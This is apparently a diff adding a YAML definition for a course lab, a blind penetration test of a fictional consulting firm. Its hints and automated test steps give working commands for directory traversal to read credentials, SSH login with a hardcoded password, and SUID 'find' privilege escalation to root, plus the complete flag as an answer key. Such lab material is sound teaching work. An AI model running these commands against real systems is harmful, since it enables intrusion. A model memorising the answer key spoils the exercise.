@@ -1,0 +1,127 @@
+name: "Apex Meridian Group - Blind Penetration Test"
+description: "Execute a full penetration test against Apex Meridian Group's infrastructure with zero guidance. Discover and exploit a web application vulnerability, pivot to an internal server, and escalate privileges to prove complete compromise."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 90
+randomize_ip_offsets: true
+visibility: course
+week: 9
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/25_Blind_Penetration_Test/"
+flag: "OCR{bl1nd_p1v0t_r00t3d}"
+
+objectives:
+  - Enumerate services across multiple target systems
+  - Identify and exploit a directory traversal vulnerability in the web application
+  - Discover sensitive configuration files containing backend credentials
+  - Retrieve the first assessment marker from the web server
+  - Pivot to the backend server using discovered SSH credentials
+  - Retrieve the second assessment marker from the backend server
+  - Escalate privileges on the backend server to achieve root access
+  - Retrieve the third assessment marker and assemble the complete flag
+
+scenario: |
+  Apex Meridian Group is a mid-size management consulting firm headquartered in
+  Charlotte, North Carolina. They are preparing for a federal contract bid and
+  require an independent security assessment of their infrastructure before
+  submission. Your firm has been engaged for a black-box penetration test.
+
+  Your point of contact is Daniel Reeves (Director of IT): "We have a public-facing
+  web server that hosts our corporate site and a document download portal. Behind
+  that sits our backend application server that handles internal processing. The
+  backend should only be reachable by our operations team - not from the outside."
+
+  This is a blind assessment. You will receive no step-by-step instructions. Apply
+  everything you have learned about reconnaissance, web exploitation, lateral
+  movement, and privilege escalation. Three assessment markers are distributed
+  across the infrastructure. Retrieve all three and assemble the flag to
+  demonstrate full compromise.
+
+  No hints are available for the first 30 minutes. This is a test.
+
+credentials: []
+
+hints:
+  - text: |
+      Start with the web server. Run nmap to discover services. The web application
+      has a file download feature - examine the URL parameters closely and test
+      for path manipulation. Configuration files on the server may contain
+      credentials for internal systems.
+    unlock_after_minutes: 30
+  - text: |
+      The /download endpoint accepts a file parameter. Try traversing out of the
+      document root with ../ sequences to reach sensitive directories. Look for
+      configuration files in ../config/ that contain SSH credentials for the
+      backend server. The first marker is also in the config directory.
+    unlock_after_minutes: 45
+  - text: |
+      Web server: curl "http://<webserver>/download?file=../config/app.env" reveals
+      BACKEND_SSH_USER and BACKEND_SSH_PASS. The first marker is at
+      ../config/assessment_marker.txt. Use the discovered credentials to SSH into
+      the backend server. On the backend, check for SUID binaries with
+      find / -perm -4000 -type f 2>/dev/null and use GTFOBins techniques to
+      escalate to root. The second marker is in deploy's home directory. The
+      third marker requires root access.
+    unlock_after_minutes: 60
+
+topology:
+  nodes:
+    - id: "webserver"
+      label: "Apex Web Server"
+      type: "server"
+      ip_offset: "13"
+      ports: [80]
+      services: ["Flask Web App"]
+      x: 2
+      y: 1
+    - id: "backend"
+      label: "Backend App Server"
+      type: "server"
+      ip_offset: "38"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 4
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webserver"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "backend"
+      label: "SSH:22"
+      access: "direct"
+    - from: "webserver"
+      to: "backend"
+      label: "SSH:22"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Web server responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webserver}/"
+      expect: "200"
+
+    - name: "Directory traversal retrieves SSH credentials from app.env"
+      command: "curl -s 'http://{target.webserver}/download?file=../config/app.env' | grep -o 'BACKEND_SSH_PASS=[^ ]*' | sed 's/BACKEND_SSH_PASS=//'"
+      expect: "Ap3x_D3pl0y_2024#"
+      timeout: 15
+
+    - name: "Read token 1 from assessment_marker.txt via traversal"
+      command: "curl -s 'http://{target.webserver}/download?file=../config/assessment_marker.txt'"
+      expect: "bl1nd"
+      timeout: 15
+
+    - name: "SSH to backend with discovered credentials and read token 2"
+      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'cat /home/deploy/marker.txt' 2>/dev/null"
+      expect: "p1v0t"
+      timeout: 15
+
+    - name: "Exploit SUID find to read token 3 from /root/flag.txt"
+      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      expect: "r00t3d"
+      timeout: 15
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{bl1nd_p1v0t_r00t3d}'"
+      expect: "OCR{"
